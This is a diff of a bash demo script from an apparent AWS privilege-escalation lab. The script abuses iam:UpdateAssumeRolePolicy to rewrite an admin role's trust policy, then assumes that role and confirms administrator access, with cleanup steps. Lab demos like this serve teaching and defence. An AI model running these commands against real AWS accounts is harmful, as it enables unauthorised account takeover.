@@ -1,7 +1,8 @@
 #!/bin/bash
 
-# Demo script for iam:UpdateAssumeRolePolicy privilege escalation
-# This is a ROLE-BASED one-hop scenario
+# Demo script for iam-updateassumerolepolicy privilege escalation
+# This scenario demonstrates how a user with iam:UpdateAssumeRolePolicy permission
+# can modify an admin role's trust policy to grant themselves access.
 
 set -e
 
@@ -12,23 +13,22 @@ export AWS_PAGER=""
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
 NC='\033[0m' # No Color
 
 # Configuration
-STARTING_USER="pl-prod-uar-to-admin-starting-user"
-STARTING_ROLE="pl-prod-uar-to-admin-starting-role"
-TARGET_ROLE="pl-prod-uar-to-admin-target-role"
+STARTING_USER="pl-prod-uarp-to-admin-starting-user"
+TARGET_ROLE="pl-prod-uarp-to-admin-target-role"
 
 echo -e "${GREEN}========================================${NC}"
 echo -e "${GREEN}IAM UpdateAssumeRolePolicy Privilege Escalation Demo${NC}"
-echo -e "${GREEN}========================================${NC}"
-echo -e "${YELLOW}Role-Based One-Hop Escalation${NC}\n"
+echo -e "${GREEN}========================================${NC}\n"
 
-# Step 1: Get credentials from Terraform output
-echo -e "${YELLOW}Step 1: Getting starting user credentials from Terraform${NC}"
-cd ../../../../../..  # Go to project root
+# Step 1: Retrieve credentials and region from Terraform grouped outputs
+echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
+cd ../../../../../..  # Navigate to root of terraform project
 
-# Get the module output
+# Get the module output using the grouped output pattern
 MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_iam_updateassumerolepolicy.value // empty')
 
 if [ -z "$MODULE_OUTPUT" ]; then
@@ -37,60 +37,75 @@ if [ -z "$MODULE_OUTPUT" ]; then
     exit 1
 fi
 
-# Extract credentials and ARNs
-export AWS_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
-export AWS_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
-STARTING_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.starting_role_arn')
+# Extract credentials
+STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
+STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
 TARGET_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.target_role_arn')
+TARGET_ROLE_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.target_role_name')
 
-if [ "$AWS_ACCESS_KEY_ID" == "null" ] || [ -z "$AWS_ACCESS_KEY_ID" ]; then
+if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
     echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
     exit 1
 fi
 
-echo -e "${GREEN}✓ Retrieved credentials for $STARTING_USER${NC}\n"
+# Get region
+AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
 
-cd - > /dev/null  # Return to scenario directory
+if [ -z "$AWS_REGION" ]; then
+    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
+    AWS_REGION="us-east-1"
+fi
 
-# Step 2: Verify identity as user
-echo -e "${YELLOW}Step 2: Verifying identity${NC}"
-CURRENT_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
-echo "Current identity: $CURRENT_IDENTITY"
+echo "Retrieved access key for: $STARTING_USER"
+echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
+echo "Region: $AWS_REGION"
+echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"
 
-if [[ ! $CURRENT_IDENTITY == *"$STARTING_USER"* ]]; then
-    echo -e "${RED}Error: Not running as expected user${NC}"
+# Navigate back to scenario directory
+cd - > /dev/null
+
+# Step 2: Configure AWS credentials with starting user
+echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
+export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
+export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
+export AWS_REGION=$AWS_REGION
+unset AWS_SESSION_TOKEN
+
+echo "Using region: $AWS_REGION"
+
+# Verify starting user identity
+CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
+echo "Current identity: $CURRENT_USER"
+
+if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
+    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
     exit 1
 fi
-echo -e "${GREEN}✓ Verified identity as $STARTING_USER${NC}\n"
+echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
-# Step 3: Assume the starting role
-echo -e "${YELLOW}Step 3: Assuming starting role${NC}"
-echo "Role ARN: $STARTING_ROLE_ARN"
-
-ASSUME_ROLE_OUTPUT=$(aws sts assume-role \
-    --role-arn "$STARTING_ROLE_ARN" \
-    --role-session-name "uar-demo-session")
-
-# Update credentials to use assumed role
-export AWS_ACCESS_KEY_ID=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.AccessKeyId')
-export AWS_SECRET_ACCESS_KEY=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SecretAccessKey')
-export AWS_SESSION_TOKEN=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SessionToken')
-
-echo -e "${GREEN}✓ Successfully assumed role $STARTING_ROLE${NC}\n"
+# Step 3: Get account ID
+echo -e "${YELLOW}Step 3: Getting account ID${NC}"
+ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
+echo "Account ID: $ACCOUNT_ID"
+echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 
 # Step 4: Check current trust policy of target role
-echo -e "${YELLOW}Step 4: Checking current trust policy of target role${NC}"
+echo -e "${YELLOW}Step 4: Examining target admin role${NC}"
+echo "Target role: $TARGET_ROLE_NAME"
 echo "Target role ARN: $TARGET_ROLE_ARN"
 
-CURRENT_TRUST_POLICY=$(aws iam get-role --role-name $TARGET_ROLE --query 'Role.AssumeRolePolicyDocument' --output json)
+echo -e "\nRetrieving current trust policy..."
+CURRENT_TRUST_POLICY=$(aws iam get-role --role-name $TARGET_ROLE_NAME --query 'Role.AssumeRolePolicyDocument' --output json)
 echo "Current trust policy:"
 echo "$CURRENT_TRUST_POLICY" | jq '.'
 
 # Save original trust policy for cleanup
-echo "$CURRENT_TRUST_POLICY" > /tmp/original_trust_policy_uar.json
+echo "$CURRENT_TRUST_POLICY" > /tmp/original_trust_policy_uarp.json
+echo -e "${GREEN}✓ Saved original trust policy${NC}\n"
 
-# Try to assume the target role (should fail)
-echo -e "\n${YELLOW}Attempting to assume target role (should fail)...${NC}"
+# Step 5: Verify we cannot assume the target role yet
+echo -e "${YELLOW}Step 5: Verifying we cannot assume target role yet${NC}"
+echo "Attempting to assume target role (should fail)..."
 if aws sts assume-role --role-arn "$TARGET_ROLE_ARN" --role-session-name test-session &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly able to assume target role already${NC}"
 else
@@ -98,19 +113,23 @@ else
 fi
 echo ""
 
-# Step 5: Verify we don't have admin permissions yet
-echo -e "${YELLOW}Step 5: Verifying we don't have admin permissions yet${NC}"
+# Step 6: Verify we don't have admin permissions yet
+echo -e "${YELLOW}Step 6: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
 if aws iam list-users --max-items 1 &> /dev/null; then
-    echo -e "${RED}⚠ Unexpectedly have list-users permission already${NC}"
+    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
     echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (no admin access yet)${NC}"
 fi
 echo ""
 
-# Step 6: Update the trust policy to allow our role to assume it
-echo -e "${YELLOW}Step 6: Updating trust policy via iam:UpdateAssumeRolePolicy${NC}"
-echo "Modifying target role trust policy to allow $STARTING_ROLE to assume it..."
+# Step 7: Update the trust policy to allow our user to assume it
+echo -e "${YELLOW}Step 7: Exploiting iam:UpdateAssumeRolePolicy permission${NC}"
+echo "Modifying target role trust policy to allow $STARTING_USER to assume it..."
+
+# Get our user ARN
+USER_ARN=$(aws sts get-caller-identity --query 'Arn' --output text)
+echo "Our user ARN: $USER_ARN"
 
 NEW_TRUST_POLICY=$(cat <<EOF
 {
@@ -119,7 +138,7 @@ NEW_TRUST_POLICY=$(cat <<EOF
     {
       "Effect": "Allow",
       "Principal": {
-        "AWS": "$STARTING_ROLE_ARN"
+        "AWS": "$USER_ARN"
       },
       "Action": "sts:AssumeRole"
     }
@@ -128,62 +147,81 @@ NEW_TRUST_POLICY=$(cat <<EOF
 EOF
 )
 
-echo "New trust policy to be applied:"
+echo -e "\nNew trust policy to be applied:"
 echo "$NEW_TRUST_POLICY" | jq '.'
 
 # Update the trust policy
 aws iam update-assume-role-policy \
-    --role-name $TARGET_ROLE \
+    --role-name $TARGET_ROLE_NAME \
     --policy-document "$NEW_TRUST_POLICY"
 
 echo -e "${GREEN}✓ Successfully updated trust policy!${NC}\n"
 
-# Wait for IAM propagation
+# Wait for IAM propagation (15 seconds required for IAM changes)
 echo -e "${YELLOW}Waiting 15 seconds for IAM changes to propagate...${NC}"
 sleep 15
-echo ""
+echo -e "${GREEN}✓ IAM changes propagated${NC}\n"
 
-# Step 7: Assume the target admin role
-echo -e "${YELLOW}Step 7: Assuming the target admin role${NC}"
+# Step 8: Verify the trust policy was updated
+echo -e "${YELLOW}Step 8: Verifying trust policy modification${NC}"
+UPDATED_TRUST_POLICY=$(aws iam get-role --role-name $TARGET_ROLE_NAME --query 'Role.AssumeRolePolicyDocument' --output json)
+echo "Updated trust policy:"
+echo "$UPDATED_TRUST_POLICY" | jq '.'
+echo -e "${GREEN}✓ Trust policy successfully modified${NC}\n"
+
+# Step 9: Assume the target admin role
+echo -e "${YELLOW}Step 9: Assuming the target admin role${NC}"
+echo "Role ARN: $TARGET_ROLE_ARN"
+
 TARGET_CREDENTIALS=$(aws sts assume-role \
     --role-arn "$TARGET_ROLE_ARN" \
-    --role-session-name admin-session \
+    --role-session-name admin-escalation-session \
     --output json)
 
-# Extract target role credentials
+# Switch to target role credentials
 export AWS_ACCESS_KEY_ID=$(echo "$TARGET_CREDENTIALS" | jq -r '.Credentials.AccessKeyId')
 export AWS_SECRET_ACCESS_KEY=$(echo "$TARGET_CREDENTIALS" | jq -r '.Credentials.SecretAccessKey')
 export AWS_SESSION_TOKEN=$(echo "$TARGET_CREDENTIALS" | jq -r '.Credentials.SessionToken')
+# Keep region consistent
+export AWS_REGION=$AWS_REGION
 
 # Verify target role assumption
 TARGET_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "New identity: $TARGET_IDENTITY"
 echo -e "${GREEN}✓ Successfully assumed target admin role!${NC}\n"
 
-# Step 8: Verify admin access
-echo -e "${YELLOW}Step 8: Verifying administrative access${NC}"
-echo "Testing admin permissions (listing IAM users)..."
+# Step 10: Verify administrator access
+echo -e "${YELLOW}Step 10: Verifying administrator access${NC}"
+echo "Attempting to list IAM users..."
 
-IAM_USERS=$(aws iam list-users --max-items 5 --query 'Users[*].UserName' --output text)
-echo -e "${GREEN}✓ Successfully listed IAM users: $IAM_USERS${NC}"
-
-echo "Testing S3 access..."
-aws s3 ls | head -5 || echo -e "${YELLOW}(No buckets or still propagating)${NC}"
-
-echo -e "${GREEN}✓ Confirmed administrator access!${NC}\n"
-
-# Summary
-echo -e "${GREEN}========================================${NC}"
-echo -e "${GREEN}Attack Summary${NC}"
-echo -e "${GREEN}========================================${NC}"
-echo -e "Starting Point: User ${YELLOW}$STARTING_USER${NC}"
-echo -e "Step 1: Assumed role ${YELLOW}$STARTING_ROLE${NC}"
-echo -e "Step 2: Used ${YELLOW}iam:UpdateAssumeRolePolicy${NC} to modify $TARGET_ROLE trust policy"
-echo -e "Step 3: Assumed ${YELLOW}$TARGET_ROLE${NC} (admin role)"
-echo -e "Result: ${GREEN}Administrator Access${NC}"
+if aws iam list-users --max-items 3 --output table; then
+    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
+    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
+else
+    echo -e "${RED}✗ Failed to list users${NC}"
+    exit 1
+fi
 echo ""
-echo -e "${YELLOW}Attack Path:${NC}"
-echo -e "  $STARTING_USER → (AssumeRole) → $STARTING_ROLE → (UpdateAssumeRolePolicy) → $TARGET_ROLE → Admin"
-echo ""
-echo -e "${RED}IMPORTANT: Run cleanup_attack.sh to restore the original trust policy${NC}"
+
+# Final summary
+echo -e "\n${GREEN}========================================${NC}"
+echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
+echo -e "${GREEN}========================================${NC}"
+echo -e "\n${YELLOW}Attack Summary:${NC}"
+echo "1. Started as: $STARTING_USER"
+echo "2. Used iam:UpdateAssumeRolePolicy to modify $TARGET_ROLE trust policy"
+echo "3. Added our user as a trusted principal"
+echo "4. Assumed the $TARGET_ROLE (which has AdministratorAccess)"
+echo "5. Achieved: Full administrative access to the AWS account"
+
+echo -e "\n${YELLOW}Attack Path:${NC}"
+echo "  $STARTING_USER → (iam:UpdateAssumeRolePolicy) → Modify Trust → (sts:AssumeRole) → $TARGET_ROLE → Administrator"
+
+echo -e "\n${YELLOW}Attack Artifacts:${NC}"
+echo "- Modified trust policy on role: $TARGET_ROLE_NAME"
+echo "- Active assumed role session: admin-escalation-session"
+
+echo -e "\n${RED}⚠ Warning: The target role's trust policy has been modified${NC}"
+echo -e "${YELLOW}To clean up and restore the original trust policy:${NC}"
+echo "  ./cleanup_attack.sh"
 echo ""
